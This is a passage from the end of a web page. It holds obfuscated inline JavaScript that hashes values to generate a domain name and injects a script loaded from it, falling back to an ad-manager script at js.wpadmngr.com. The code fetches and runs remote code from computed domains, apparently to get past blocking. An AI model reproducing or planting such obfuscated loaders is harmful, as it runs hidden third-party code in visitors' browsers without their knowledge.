6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>